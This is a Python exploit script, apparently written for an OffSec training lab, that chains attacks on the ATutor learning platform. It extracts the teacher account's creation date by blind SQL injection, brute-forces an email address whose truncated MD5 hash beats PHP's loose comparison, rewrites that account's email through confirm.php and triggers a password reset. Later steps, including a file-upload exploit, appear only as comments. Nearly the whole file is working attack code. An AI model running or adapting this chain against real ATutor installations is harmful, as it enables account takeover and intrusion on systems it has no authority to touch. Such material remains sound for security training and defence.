import sys
sys.path.append('..')
import os

import asyncio
from lib.mysqli_template_async import get_string
from lib.mysqli_template_async import get_length

import hashlib, string, itertools, re, sys, requests
import netifaces as ni

from io import BytesIO
try:
    import uvloop
    uvloop.install()
except:
    pass

def gen_magic_email(domain, id, date, prefix_length):
    count = 0
    for word in map(''.join, itertools.product(string.ascii_lowercase,repeat=int(prefix_length))):
        words_combined = F"{word}@{domain}{date}{id}"#"%s@%s" % (word, domain) + date + id
        hash = hashlib.md5(words_combined.encode("latin1")).hexdigest()[:10]
        if re.match(r'0+[eE]\d+$', hash):
            print(F"(+) Found a valid email! {word}@{domain}")
            print(F"(+) Requests made: {count}")
            print(F"(+) Equivalent loose comparison: {hash} == 0" )
            return F"{word}@{domain}"
        count += 1
    return ''

async def main():
    # 1. use sqli to exfil teacher account creation date
    blind_sqli_truthy = lambda url, sub_query, comment: F"{url}test') OR (select if(1=1,({sub_query}),1)){comment}"
    url = "http://atutor/ATutor/mods/_standard/social/index_public.php?q="
    conditional_error = lambda response: int(response.headers['Content-Length']) == 180
    query_encoder = lambda s: s.replace(' ','/**/')
    acct_query = "select creation_date from AT_members where member_id=1"
    acct_strlen = await get_length(url, base_query=blind_sqli_truthy, sub_query=acct_query, response_truth_condition=conditional_error, query_encoder=query_encoder)
    acct_creation_date = await get_string(url=url, base_query=blind_sqli_truthy, sub_query=acct_query, response_truth_condition=conditional_error, strlen=acct_strlen, query_encoder=query_encoder)
    print(F"(+) Teacher account creation date: {acct_creation_date}")
    # 2. gen email
    magic_email = gen_magic_email('offsec.local', "1", acct_creation_date, 3) 
    # 3. reset email to magic email
    url = F"http://atutor/ATutor/confirm.php?e={magic_email}&m=0&id=1"
    print (F"(*) Issuing update request to URL: {url}" )
    res = requests.get(url, allow_redirects=False)
    if (res.status_code == 302):
        print("(+) Email change successful")
    else:
        ("(-) Error resetting email address")
        exit(1)
    # 4. Get a password reset link
    pw_reset_url='http://atutor/ATutor/password_reminder.php'
    pw_reset_params = {"form_password_reminder": "true", "form_email": magic_email, "submit": "Submit"}
    res = requests.post(pw_reset_url, data=pw_reset_params, allow_redirects=False)
    #res = requests.post(pw_reset_url, data=pw_reset_params,, allow_redirects=False, proxies={'http':'http://192.168.177.1:8080'})
    if (res.status_code == 302):
        print("(+) Trigger password reset success")
    else:
        ("(-) Error Triggering password reset")
        exit(1)
    # 5. get reset link from atmail email
    # 6. change password
    #pw_reset_url='http://atutor/Atutor/password_reminder.php'
    #pw_change_params = {"form_change": "true", "id": "1", "g": "19262", "h": "238e5f23be70c47", "form_password_hidden": "8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e", "password_error": '', "password": '', "password2": '', "submit": "Submit"}
    # 7. login and reuse file upload vuln
if __name__ == "__main__":
    try:
        asyncio.run(main())
    # https://github.com/MagicStack/uvloop/issues/349
    except NotImplementedError:
        pass















